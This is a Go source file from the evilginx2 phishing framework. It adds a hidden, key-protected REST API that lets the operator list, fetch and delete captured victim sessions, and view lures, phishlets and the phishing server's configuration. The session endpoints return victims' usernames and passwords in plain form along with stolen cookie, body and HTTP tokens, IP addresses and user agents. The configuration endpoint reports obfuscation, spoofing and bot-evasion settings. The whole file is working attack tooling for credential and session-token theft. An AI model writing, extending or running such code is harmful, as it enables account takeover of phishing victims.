package core

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type ApiServer struct {
	cfg *Config
	db  *database.Database
}

func NewApiServer(cfg *Config, db *database.Database) *ApiServer {
	return &ApiServer{
		cfg: cfg,
		db:  db,
	}
}

// HandleApiRequest checks if the request is an API request and handles it.
// Returns true if the request was handled, false if it should be passed to the proxy.
func (api *ApiServer) HandleApiRequest(w http.ResponseWriter, req *http.Request) bool {
	if !api.cfg.IsApiEnabled() {
		return false
	}

	secretPath := api.cfg.GetApiSecretPath()
	if secretPath == "" {
		return false
	}

	// Ensure secret path starts with /
	if !strings.HasPrefix(secretPath, "/") {
		secretPath = "/" + secretPath
	}

	// Check if the request path matches the API secret path prefix
	if !strings.HasPrefix(req.URL.Path, secretPath) {
		return false
	}

	// Authenticate via X-Api-Key header
	apiKey := api.cfg.GetApiKey()
	if apiKey == "" {
		api.jsonError(w, http.StatusServiceUnavailable, "API key not configured")
		return true
	}

	providedKey := req.Header.Get("X-Api-Key")
	if providedKey != apiKey {
		api.jsonError(w, http.StatusUnauthorized, "invalid API key")
		return true
	}

	// Strip the secret path prefix to get the actual API path
	apiPath := strings.TrimPrefix(req.URL.Path, secretPath)
	if apiPath == "" || apiPath == "/" {
		apiPath = "/"
	}

	// Route API requests
	switch {
	case req.Method == "GET" && apiPath == "/":
		api.handleIndex(w, req)
	case req.Method == "GET" && apiPath == "/sessions":
		api.handleGetSessions(w, req)
	case req.Method == "GET" && strings.HasPrefix(apiPath, "/sessions/"):
		api.handleGetSession(w, req, apiPath)
	case req.Method == "DELETE" && strings.HasPrefix(apiPath, "/sessions/"):
		api.handleDeleteSession(w, req, apiPath)
	case req.Method == "GET" && apiPath == "/lures":
		api.handleGetLures(w, req)
	case req.Method == "GET" && apiPath == "/phishlets":
		api.handleGetPhishlets(w, req)
	case req.Method == "GET" && apiPath == "/config":
		api.handleGetConfig(w, req)
	default:
		api.jsonError(w, http.StatusNotFound, "endpoint not found")
	}

	return true
}

func (api *ApiServer) handleIndex(w http.ResponseWriter, req *http.Request) {
	type IndexResponse struct {
		Name      string   `json:"name"`
		Version   string   `json:"version"`
		Endpoints []string `json:"endpoints"`
	}

	resp := IndexResponse{
		Name:    "evilginx2-api",
		Version: VERSION,
		Endpoints: []string{
			"GET /sessions",
			"GET /sessions/:id",
			"DELETE /sessions/:id",
			"GET /lures",
			"GET /phishlets",
			"GET /config",
		},
	}
	api.jsonResponse(w, http.StatusOK, resp)
}

func (api *ApiServer) handleGetSessions(w http.ResponseWriter, req *http.Request) {
	sessions, err := api.db.ListSessions()
	if err != nil {
		api.jsonError(w, http.StatusInternalServerError, fmt.Sprintf("database error: %v", err))
		return
	}

	type SessionSummary struct {
		Id         int    `json:"id"`
		Phishlet   string `json:"phishlet"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		HasTokens  bool   `json:"has_tokens"`
		RemoteAddr string `json:"remote_addr"`
		UserAgent  string `json:"user_agent"`
		LandingURL string `json:"landing_url"`
		CreateTime string `json:"create_time"`
		UpdateTime string `json:"update_time"`
	}

	var result []SessionSummary
	for _, s := range sessions {
		hasTokens := len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0
		result = append(result, SessionSummary{
			Id:         s.Id,
			Phishlet:   s.Phishlet,
			Username:   s.Username,
			Password:   s.Password,
			HasTokens:  hasTokens,
			RemoteAddr: s.RemoteAddr,
			UserAgent:  s.UserAgent,
			LandingURL: s.LandingURL,
			CreateTime: time.Unix(s.CreateTime, 0).Format(time.RFC3339),
			UpdateTime: time.Unix(s.UpdateTime, 0).Format(time.RFC3339),
		})
	}

	if result == nil {
		result = []SessionSummary{}
	}

	api.jsonResponse(w, http.StatusOK, result)
}

func (api *ApiServer) handleGetSession(w http.ResponseWriter, req *http.Request, apiPath string) {
	idStr := strings.TrimPrefix(apiPath, "/sessions/")
	id, err := strconv.Atoi(idStr)
	if err != nil {
		api.jsonError(w, http.StatusBadRequest, "invalid session id")
		return
	}

	sessions, err := api.db.ListSessions()
	if err != nil {
		api.jsonError(w, http.StatusInternalServerError, fmt.Sprintf("database error: %v", err))
		return
	}

	for _, s := range sessions {
		if s.Id == id {
			type SessionDetail struct {
				Id           int                                        `json:"id"`
				SessionId    string                                     `json:"session_id"`
				Phishlet     string                                     `json:"phishlet"`
				Username     string                                     `json:"username"`
				Password     string                                     `json:"password"`
				Custom       map[string]string                          `json:"custom"`
				BodyTokens   map[string]string                          `json:"body_tokens"`
				HttpTokens   map[string]string                          `json:"http_tokens"`
				CookieTokens map[string]map[string]*database.CookieToken `json:"cookie_tokens"`
				RemoteAddr   string                                     `json:"remote_addr"`
				UserAgent    string                                     `json:"user_agent"`
				LandingURL   string                                     `json:"landing_url"`
				CreateTime   string                                     `json:"create_time"`
				UpdateTime   string                                     `json:"update_time"`
			}

			detail := SessionDetail{
				Id:           s.Id,
				SessionId:    s.SessionId,
				Phishlet:     s.Phishlet,
				Username:     s.Username,
				Password:     s.Password,
				Custom:       s.Custom,
				BodyTokens:   s.BodyTokens,
				HttpTokens:   s.HttpTokens,
				CookieTokens: s.CookieTokens,
				RemoteAddr:   s.RemoteAddr,
				UserAgent:    s.UserAgent,
				LandingURL:   s.LandingURL,
				CreateTime:   time.Unix(s.CreateTime, 0).Format(time.RFC3339),
				UpdateTime:   time.Unix(s.UpdateTime, 0).Format(time.RFC3339),
			}
			api.jsonResponse(w, http.StatusOK, detail)
			return
		}
	}

	api.jsonError(w, http.StatusNotFound, fmt.Sprintf("session %d not found", id))
}

func (api *ApiServer) handleDeleteSession(w http.ResponseWriter, req *http.Request, apiPath string) {
	idStr := strings.TrimPrefix(apiPath, "/sessions/")
	id, err := strconv.Atoi(idStr)
	if err != nil {
		api.jsonError(w, http.StatusBadRequest, "invalid session id")
		return
	}

	err = api.db.DeleteSessionById(id)
	if err != nil {
		api.jsonError(w, http.StatusNotFound, fmt.Sprintf("session %d not found", id))
		return
	}

	log.Info("api: deleted session %d", id)
	api.jsonResponse(w, http.StatusOK, map[string]string{"status": "deleted"})
}

func (api *ApiServer) handleGetLures(w http.ResponseWriter, req *http.Request) {
	lures := api.cfg.GetLures()

	type LureResponse struct {
		Id              int    `json:"id"`
		Phishlet        string `json:"phishlet"`
		Hostname        string `json:"hostname"`
		Path            string `json:"path"`
		RedirectUrl     string `json:"redirect_url"`
		Redirector      string `json:"redirector"`
		UserAgentFilter string `json:"ua_filter"`
		Info            string `json:"info"`
		OgTitle         string `json:"og_title"`
		OgDescription   string `json:"og_desc"`
		OgImageUrl      string `json:"og_image"`
		OgUrl           string `json:"og_url"`
		PausedUntil     int64  `json:"paused_until"`
		Proxy           string `json:"proxy"`
	}

	var result []LureResponse
	for i, l := range lures {
		result = append(result, LureResponse{
			Id:              i,
			Phishlet:        l.Phishlet,
			Hostname:        l.Hostname,
			Path:            l.Path,
			RedirectUrl:     l.RedirectUrl,
			Redirector:      l.Redirector,
			UserAgentFilter: l.UserAgentFilter,
			Info:            l.Info,
			OgTitle:         l.OgTitle,
			OgDescription:   l.OgDescription,
			OgImageUrl:      l.OgImageUrl,
			OgUrl:           l.OgUrl,
			PausedUntil:     l.PausedUntil,
			Proxy:           l.Proxy,
		})
	}

	if result == nil {
		result = []LureResponse{}
	}

	api.jsonResponse(w, http.StatusOK, result)
}

func (api *ApiServer) handleGetPhishlets(w http.ResponseWriter, req *http.Request) {
	type PhishletResponse struct {
		Name      string `json:"name"`
		Hostname  string `json:"hostname"`
		Enabled   bool   `json:"enabled"`
		Visible   bool   `json:"visible"`
		Domain    string `json:"domain"`
		UnauthUrl string `json:"unauth_url"`
		Proxy     string `json:"proxy"`
	}

	var result []PhishletResponse
	for _, name := range api.cfg.GetPhishletNames() {
		pc := api.cfg.PhishletConfig(name)
		result = append(result, PhishletResponse{
			Name:      name,
			Hostname:  pc.Hostname,
			Enabled:   pc.Enabled,
			Visible:   pc.Visible,
			Domain:    pc.Domain,
			UnauthUrl: pc.UnauthUrl,
			Proxy:     pc.Proxy,
		})
	}

	if result == nil {
		result = []PhishletResponse{}
	}

	api.jsonResponse(w, http.StatusOK, result)
}

func (api *ApiServer) handleGetConfig(w http.ResponseWriter, req *http.Request) {
	type ConfigResponse struct {
		Domain           string `json:"domain"`
		ExternalIpv4     string `json:"external_ipv4"`
		HttpsPort        int    `json:"https_port"`
		DnsPort          int    `json:"dns_port"`
		UnauthUrl        string `json:"unauth_url"`
		Autocert         bool   `json:"autocert"`
		JsObfuscation    string `json:"js_obfuscation"`
		HtmlObfuscation  bool   `json:"html_obfuscation"`
		SpoofEnabled     bool   `json:"spoof_enabled"`
		SpoofUrl         string `json:"spoof_url"`
		BotguardEnabled  bool   `json:"botguard_enabled"`
		BlacklistMode    string `json:"blacklist_mode"`
		ServerName       string `json:"server_name"`
	}

	result := ConfigResponse{
		Domain:          api.cfg.GetBaseDomain(),
		ExternalIpv4:    api.cfg.GetServerExternalIP(),
		HttpsPort:       api.cfg.GetHttpsPort(),
		DnsPort:         api.cfg.GetDnsPort(),
		UnauthUrl:       api.cfg.general.UnauthUrl,
		Autocert:        api.cfg.IsAutocertEnabled(),
		JsObfuscation:   api.cfg.GetJsObfuscationLevel(),
		HtmlObfuscation: api.cfg.IsHtmlObfuscationEnabled(),
		SpoofEnabled:    api.cfg.IsSpoofEnabled(),
		SpoofUrl:        api.cfg.GetSpoofUrl(),
		BotguardEnabled: api.cfg.IsBotguardEnabled(),
		BlacklistMode:   api.cfg.GetBlacklistMode(),
		ServerName:      api.cfg.GetServerName(),
	}

	api.jsonResponse(w, http.StatusOK, result)
}

func (api *ApiServer) jsonResponse(w http.ResponseWriter, status int, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(data)
}

func (api *ApiServer) jsonError(w http.ResponseWriter, status int, message string) {
	type ErrorResponse struct {
		Error string `json:"error"`
	}
	api.jsonResponse(w, status, ErrorResponse{Error: message})
}
